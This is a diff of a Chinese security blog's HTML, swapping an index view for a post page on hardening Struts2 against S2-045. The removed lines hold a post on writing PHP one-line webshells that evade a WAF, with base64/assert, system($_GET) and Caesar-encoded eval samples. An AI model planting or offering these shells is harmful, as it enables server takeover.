@@ -3,14 +3,18 @@
 <head>
   <meta charset="utf-8">
   
-  <title>iosmosis&#39;s blog</title>
+  <title>Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法 | iosmosis&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="iosmosis's blog">
-<meta property="og:url" content="http://iosmosis.github.io/index.html">
+  <meta name="description" content="近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。漏洞编号S2-045，CVE-2017-5638漏洞名称基于 Jakarta plugin插件的Struts远程代码执行漏洞官方评级高危漏洞描述Apache Struts 2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法">
+<meta property="og:url" content="http://iosmosis.github.io/2017/03/07/str2-045/index.html">
 <meta property="og:site_name" content="iosmosis's blog">
+<meta property="og:description" content="近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。漏洞编号S2-045，CVE-2017-5638漏洞名称基于 Jakarta plugin插件的Struts远程代码执行漏洞官方评级高危漏洞描述Apache Struts 2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，">
+<meta property="og:updated_time" content="2017-03-07T11:31:31.359Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="iosmosis's blog">
+<meta name="twitter:title" content="Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法">
+<meta name="twitter:description" content="近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。漏洞编号S2-045，CVE-2017-5638漏洞名称基于 Jakarta plugin插件的Struts远程代码执行漏洞官方评级高危漏洞描述Apache Struts 2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，">
   
     <link rel="alternative" href="/atom.xml" title="iosmosis&#39;s blog" type="application/atom+xml">
   
@@ -24,9 +28,6 @@
   <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
   <link rel="apple-touch-icon" href="/apple-touch-icon.png">
   
-    
-    
-  
   
       <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
   
@@ -38,8 +39,8 @@
           rootUrl: '/',
           fancybox: true,
           animate: true,
-          isHome: true,
-          isPost: false,
+          isHome: false,
+          isPost: true,
           isArchive: false,
           isTag: false,
           isCategory: false,
@@ -215,9 +216,7 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap">
-  
-    <article id="post-str2-045" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-str2-045" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
       <a href="/2017/03/07/str2-045/" class="article-date">
@@ -233,12 +232,19 @@
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/03/07/str2-045/">Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法</a>
+    <h1 class="article-title" itemprop="name">
+      Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法
     </h1>
   
 
       </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
       
     
     <div class="article-entry" itemprop="articleBody">
@@ -254,94 +260,194 @@ Created by Lukasz Lenart, last modified yesterday at 01:14 PM
 <h3 id="代表拦截所有请求，进行攻击代码检查，-action只检查-action结尾的请求。"><a href="#代表拦截所有请求，进行攻击代码检查，-action只检查-action结尾的请求。" class="headerlink" title="/代表拦截所有请求，进行攻击代码检查，.action只检查.action结尾的请求。"></a>/<em>代表拦截所有请求，进行攻击代码检查，</em>.action只检查.action结尾的请求。</h3><h3 id="如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到-Apache-Struts-2-3-32或2-5-10-1版；或者也可以切换到不同的实现文件上传Multipart解析器"><a href="#如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到-Apache-Struts-2-3-32或2-5-10-1版；或者也可以切换到不同的实现文件上传Multipart解析器" class="headerlink" title="如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到 Apache Struts 2.3.32或2.5.10.1版；或者也可以切换到不同的实现文件上传Multipart解析器"></a>如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到 <a href="https://repository.apache.org/content/groups/staging/org/apache/struts/struts2-core/2.3.32/" target="_blank" rel="external">Apache Struts 2.3.32</a>或2.5.10.1版；或者也可以切换到不同的实现文件上传Multipart解析器</h3><h3 id="重启应用即可"><a href="#重启应用即可" class="headerlink" title="重启应用即可"></a>重启应用即可</h3>
       
       
-    </div>
-    
-    <div class="article-info article-info-index">
+        <div class="page-reward">
+          <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang" title="打赏，支持一下">赏</a></p>
+          <div class="hide_box"></div>
+          <div class="shang_box">
+            <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()" title="关闭">×</a>
+            <div class="shang_tit">
+              <p>纯属好玩</p>
+            </div>
+            <div class="shang_payimg">
+              <img src="/img/alipayimg.jpg" alt="扫码支持" title="扫一扫" />
+            </div>
+              <div class="pay_explain">扫码打赏，你说多少就多少</div>
+            <div class="shang_payselect">
+              
+                <div class="pay_item checked" data-id="alipay">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/alipay.png" alt="支付宝" /></span>
+                </div>
+              
+              
+                <div class="pay_item" data-id="wechat">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/weixin.png" alt="微信" /></span>
+                </div>
+              
+            </div>
+            <div class="shang_info">
+              <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+        </div>
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js"></script>
+        <script type="text/javascript">
+          $(".pay_item").click(function(){
+            $(this).addClass('checked').siblings('.pay_item').removeClass('checked');
+            var dataid=$(this).attr('data-id');
+            $(".shang_payimg img").attr("src","/img/"+dataid+"img.jpg");
+            $("#shang_pay_txt").text(dataid=="alipay"?"支付宝":"微信");
+          });
+          function dashangToggle(){
+            $(".hide_box").fadeToggle();
+            $(".shang_box").fadeToggle();
+          }
+        </script>
       
-      
-
-      
-      
-      <div class="clearfix"></div>
     </div>
     
   </div>
   
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/03/07/str2-045/">Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 iosmosis 的个人博客">iosmosis</a></p>
+        <p><span>发布时间:</span>2017年03月07日 - 15时02分</p>
+        <p><span>最后更新:</span>2017年03月07日 - 19时31分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/03/07/str2-045/" title="Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法">http://iosmosis.github.io/2017/03/07/str2-045/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://iosmosis.github.io/2017/03/07/str2-045/　　作者: iosmosis" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/2017/03/05/oneshell/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">一句话Shell编写思路</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
 </article>
 
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike-zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。"><span class="toc-number">1.</span> <span class="toc-text">近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞编号"><span class="toc-number"></span> <span class="toc-text">漏洞编号</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-045，CVE-2017-5638"><span class="toc-number">1.</span> <span class="toc-text">S2-045，CVE-2017-5638</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞名称"><span class="toc-number"></span> <span class="toc-text">漏洞名称</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基于-Jakarta-plugin插件的Struts远程代码执行漏洞"><span class="toc-number">1.</span> <span class="toc-text">基于 Jakarta plugin插件的Struts远程代码执行漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#官方评级"><span class="toc-number"></span> <span class="toc-text">官方评级</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#高危"><span class="toc-number">1.</span> <span class="toc-text">高危</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞描述"><span class="toc-number"></span> <span class="toc-text">漏洞描述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-Struts-2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令"><span class="toc-number">1.</span> <span class="toc-text">Apache Struts 2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用条件和方式"><span class="toc-number"></span> <span class="toc-text">漏洞利用条件和方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#黑客通过Jakarta-文件上传插件实现远程利用该漏洞执行代码。"><span class="toc-number">1.</span> <span class="toc-text">黑客通过Jakarta 文件上传插件实现远程利用该漏洞执行代码。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞影响范围"><span class="toc-number"></span> <span class="toc-text">漏洞影响范围</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Struts-2-3-5-–-Struts-2-3-31"><span class="toc-number">1.</span> <span class="toc-text">Struts 2.3.5 – Struts 2.3.31</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Poc"><span class="toc-number"></span> <span class="toc-text">Poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp"><span class="toc-number"></span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#加固方式"><span class="toc-number"></span> <span class="toc-text">加固方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#通过判断Content-Type头是否为白名单类型，来限制非法Content-Type的攻击。"><span class="toc-number">1.</span> <span class="toc-text">通过判断Content-Type头是否为白名单类型，来限制非法Content-Type的攻击。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#将Java编译以后的“SecurityFilter-class”（SecurityFilter-java是源代码文件）复制到应用的WEB-INF-classes目录下"><span class="toc-number">2.</span> <span class="toc-text">将Java编译以后的“SecurityFilter.class”（SecurityFilter.java是源代码文件）复制到应用的WEB-INF/classes目录下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#⦁-配置Filter-将下面的代码加入WEB-INF-web-xml文件中"><span class="toc-number">3.</span> <span class="toc-text">⦁    配置Filter 将下面的代码加入WEB-INF/web.xml文件中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代表拦截所有请求，进行攻击代码检查，-action只检查-action结尾的请求。"><span class="toc-number">4.</span> <span class="toc-text">/代表拦截所有请求，进行攻击代码检查，.action只检查.action结尾的请求。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到-Apache-Struts-2-3-32或2-5-10-1版；或者也可以切换到不同的实现文件上传Multipart解析器"><span class="toc-number">5.</span> <span class="toc-text">如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到 Apache Struts 2.3.32或2.5.10.1版；或者也可以切换到不同的实现文件上传Multipart解析器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#重启应用即可"><span class="toc-number">6.</span> <span class="toc-text">重启应用即可</span></a></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
 
 
 
 
 
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
 
 
 
-  
-    <article id="post-oneshell" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2017/03/05/oneshell/" class="article-date">
-      <time datetime="2017-03-05T04:47:01.000Z" itemprop="datePublished">2017-03-05</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
+
     
-      <input type="hidden" class="isFancy" />
+      <div class="duoshuo" id="comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="2017/03/07/str2-045/" data-title="Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法" data-url="http://iosmosis.github.io/2017/03/07/str2-045/"></div>
+    <!-- 多说评论框 end -->
+    <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+    <script type="text/javascript">
+    var duoshuoQuery = {short_name:"null"};
+    (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = '/js/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+         || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+    </script>
+    <!-- 多说公共JS代码 end -->
+</div>
+
     
-    
-      <header class="article-header">
+
+
+
+    <div class="scroll" id="post-nav-button">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/03/05/oneshell/">一句话Shell编写思路</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路 </p>
-<h2 id="经典方式"><a href="#经典方式" class="headerlink" title="经典方式"></a>经典方式</h2><h3 id="应该是很常见的方法-利用-可变变量进行赋值传值来打到过狗目的，例如："><a href="#应该是很常见的方法-利用-可变变量进行赋值传值来打到过狗目的，例如：" class="headerlink" title="应该是很常见的方法 利用 可变变量进行赋值传值来打到过狗目的，例如："></a>应该是很常见的方法 利用 <a href="http://www.php.net/manual/zh/language.variables.variable.php" target="_blank" rel="external">可变变量</a>进行赋值传值来打到过狗目的，例如：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $jg16=base64_decode;</div><div class="line">$z=$jg16(YXNzZXJ0);</div><div class="line">$z($_POST[q]);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">这个一句话需要用到这个函数</div><div class="line"><span class="comment">//base64_encode();//base64编码</span></div><div class="line"><span class="comment">//base64_decode();//base64解码</span></div><div class="line">主要就是进行加密然后传值绕过对一句话的检测　这次暂不详细讲解</div></pre></td></tr></table></figure>
-<p>##system()的巧妙利用</p>
-<p>##调用system()由于在php中system函数属于系统函数所以对于一般的waf是可以通杀的 </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">system($_GET[‘a’]($_GET[‘b’]))</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<h2 id="利用古典密码进行对shell加密"><a href="#利用古典密码进行对shell加密" class="headerlink" title="利用古典密码进行对shell加密"></a>利用古典密码进行对shell加密</h2><h3 id="在CTF中-经常会碰到密码学问题-比如古典密码（凯撒加密-rot13-等等）"><a href="#在CTF中-经常会碰到密码学问题-比如古典密码（凯撒加密-rot13-等等）" class="headerlink" title="在CTF中 经常会碰到密码学问题 比如古典密码（凯撒加密 rot13 等等）"></a>在CTF中 经常会碰到密码学问题 比如古典密码（凯撒加密 rot13 等等）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">kaisa</span><span class="params">($arr)</span></span>&#123;</div><div class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt; strlen($arr);$i++)&#123;</div><div class="line">$arr[$i]=chr(ord($arr[$i])<span class="number">-6</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> $arr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h3 id="这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话"><a href="#这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话" class="headerlink" title="这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话"></a>这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$arr=<span class="string">"j&#123;fq-)dUTXY`&#125;b.@"</span>;</div><div class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt; strlen($arr);$i++)&#123;</div><div class="line">$arr[$i]=chr(ord($arr[$i])<span class="number">-5</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">eval</span>($arr);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<h2 id="利用函数代码执行来代替eval"><a href="#利用函数代码执行来代替eval" class="headerlink" title="利用函数代码执行来代替eval"></a>利用函数代码执行来代替eval</h2><h3 id="利用-create-function代码执行漏洞-该函数漏洞这里不进行详细讲解-。-create-function要接收两个参数-args和-code来组成新的函数fucntion-lambda-func-args-code-并eval-function-lambda-func-args-code-，那么我们只要构造-code来闭合-然后将自己的代码放到函数体外面就可以执行"><a href="#利用-create-function代码执行漏洞-该函数漏洞这里不进行详细讲解-。-create-function要接收两个参数-args和-code来组成新的函数fucntion-lambda-func-args-code-并eval-function-lambda-func-args-code-，那么我们只要构造-code来闭合-然后将自己的代码放到函数体外面就可以执行" class="headerlink" title="利用 create_function代码执行漏洞 该函数漏洞这里不进行详细讲解 。 create_function要接收两个参数$args和$code来组成新的函数fucntion_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行"></a>利用 <a href="http://www.cnseay.com/1901/" target="_blank" rel="external">create_function代码执行漏洞</a> 该函数漏洞这里不进行详细讲解 。 create_function要接收两个参数$args和$code来组成新的函数fucntion_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行</h3><p>这里构造为$code = “n;}$_POST[x];/*”;<br>注意：双引号里面的变量会进行解析，即如果我们echo $code 并且post提交x=phpinfo();那么输出应该是：n;}phpinfo();;/</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">payload解析：</div><div class="line"> </div><div class="line">;来结束语句</div><div class="line"> </div><div class="line">&#125;来结束函数体</div><div class="line"> </div><div class="line">phpinfo();;就在函数体外面被<span class="keyword">eval</span>执行了</div><div class="line"> </div><div class="line"><span class="comment">/*注释多余的代码</span></div><div class="line"> </div><div class="line">最终代码：eval(function_lambda_func($args)&#123;n;&#125;phpinfo();;/*&#125;)</div><div class="line">最终构造出</div><div class="line"></div><div class="line">&lt;?php</div><div class="line">$args = "１";</div><div class="line">$code = "n;&#125;$_POST[x];/*";</div><div class="line">echo create_function('$args',$code);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<h3 id="这些思路-只是用来启发大家-如果更好的思路-可以一起分享-我会整合到一起"><a href="#这些思路-只是用来启发大家-如果更好的思路-可以一起分享-我会整合到一起" class="headerlink" title="这些思路 只是用来启发大家 如果更好的思路 可以一起分享 我会整合到一起"></a>这些思路 只是用来启发大家 如果更好的思路 可以一起分享 我会整合到一起</h3>
-      
-      
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2017/03/05/oneshell/" title="下一篇: 一句话Shell编写思路">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
     </div>
-    
-    <div class="article-info article-info-index">
-      
-      
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/03/07/str2-045/">Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/05/oneshell/">一句话Shell编写思路</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
 
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
 
 
-
-
-
-
-
-
-
-  
-  
+    <script>
+        
+    </script>
 </div>
       <footer id="footer">
     <div class="outer">
